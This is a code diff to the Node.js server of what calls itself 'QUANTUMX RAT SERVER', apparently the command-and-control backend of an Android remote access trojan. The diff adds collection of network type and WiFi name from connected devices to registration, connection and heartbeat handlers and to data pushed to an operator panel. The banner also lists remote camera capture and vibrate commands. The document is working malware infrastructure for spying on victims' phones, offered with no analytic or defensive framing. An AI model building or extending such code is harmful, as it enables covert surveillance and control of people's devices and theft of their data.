@@ -81,7 +81,7 @@ app.post('/api/verify', authenticateToken, (req, res) => {
 
 // Device register
 app.post('/api/device/register', (req, res) => {
-    const { deviceId, deviceName, androidVersion, manufacturer, model, batteryLevel } = req.body;
+    const { deviceId, deviceName, androidVersion, manufacturer, model, batteryLevel, networkType, networkName } = req.body;
     
     const deviceInfo = {
         deviceId,
@@ -90,6 +90,8 @@ app.post('/api/device/register', (req, res) => {
         manufacturer: manufacturer || 'Unknown',
         model: model || 'Unknown',
         batteryLevel: batteryLevel || 0,
+        networkType: networkType || 'Unknown',
+        networkName: networkName || '',
         lastSeen: new Date().toISOString(),
         online: true,
         ipAddress: req.ip || req.connection.remoteAddress,
@@ -98,7 +100,7 @@ app.post('/api/device/register', (req, res) => {
     
     devices.set(deviceId, deviceInfo);
     
-    console.log(`✅ [REGISTER] ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}%`);
+    console.log(`✅ [REGISTER] ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
     
     res.json({ success: true, deviceId, message: 'Device registered' });
 });
@@ -216,7 +218,9 @@ io.on('connection', (socket) => {
             androidVersion, 
             manufacturer, 
             model, 
-            batteryLevel 
+            batteryLevel,
+            networkType,
+            networkName
         } = data;
         
         socket.deviceId = deviceId;
@@ -233,6 +237,8 @@ io.on('connection', (socket) => {
             device.manufacturer = manufacturer || device.manufacturer;
             device.model = model || device.model;
             device.batteryLevel = batteryLevel || device.batteryLevel;
+            device.networkType = networkType || device.networkType || 'Unknown';
+            device.networkName = networkName || device.networkName || '';
             devices.set(deviceId, device);
         } else {
             const deviceInfo = {
@@ -242,6 +248,8 @@ io.on('connection', (socket) => {
                 manufacturer: manufacturer || 'Unknown',
                 model: model || 'Unknown',
                 batteryLevel: batteryLevel || 0,
+                networkType: networkType || 'Unknown',
+                networkName: networkName || '',
                 lastSeen: new Date().toISOString(),
                 online: true,
                 registeredAt: new Date().toISOString()
@@ -249,7 +257,7 @@ io.on('connection', (socket) => {
             devices.set(deviceId, deviceInfo);
         }
         
-        console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}%`);
+        console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
         
         // KIRIM DATA LENGKAP KE PANEL!
         io.emit('device-status', {
@@ -259,6 +267,8 @@ io.on('connection', (socket) => {
             manufacturer,
             model,
             batteryLevel,
+            networkType,
+            networkName,
             status: 'online',
             timestamp: new Date().toISOString()
         });
@@ -266,7 +276,7 @@ io.on('connection', (socket) => {
     
     // ===== HEARTBEAT DARI APK =====
     socket.on('heartbeat', (data) => {
-        const { deviceId, batteryLevel, deviceName, androidVersion } = data;
+        const { deviceId, batteryLevel, deviceName, androidVersion, networkType, networkName } = data;
         
         if (devices.has(deviceId)) {
             const device = devices.get(deviceId);
@@ -275,6 +285,8 @@ io.on('connection', (socket) => {
             device.batteryLevel = batteryLevel || device.batteryLevel;
             device.deviceName = deviceName || device.deviceName;
             device.androidVersion = androidVersion || device.androidVersion;
+            device.networkType = networkType || device.networkType || 'Unknown';
+            device.networkName = networkName || device.networkName || '';
             devices.set(deviceId, device);
         }
         
@@ -284,12 +296,14 @@ io.on('connection', (socket) => {
             batteryLevel,
             deviceName,
             androidVersion,
+            networkType,
+            networkName,
             timestamp: new Date().toISOString()
         });
         
         // Log heartbeat (1% chance)
         if (Math.random() < 0.01) {
-            console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}%`);
+            console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
         }
     });
     
@@ -378,7 +392,7 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔═══════════════════════════════════════════════════╗
-║    QUANTUMX RAT SERVER v3.2                       ║
+║    QUANTUMX RAT SERVER v3.3                       ║
 ║    RUNNING ON PORT: ${PORT}                                    ║
 ║    WEBSOCKET: ws://localhost:${PORT}                           ║
 ║    API: http://localhost:${PORT}/api                          ║
@@ -390,7 +404,8 @@ server.listen(PORT, () => {
 ║    ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s    ║
 ║    📷 [CAMERA] CAPTURING -> Device                   ║
 ║    ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN       ║
-║    💓 [HEARTBEAT] Device - 82% (1% chance)          ║
+║    📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID ║
+║    💓 [HEARTBEAT] Device - 82% - NETWORK: 4G        ║
 ╚═══════════════════════════════════════════════════╝
     `);
 });
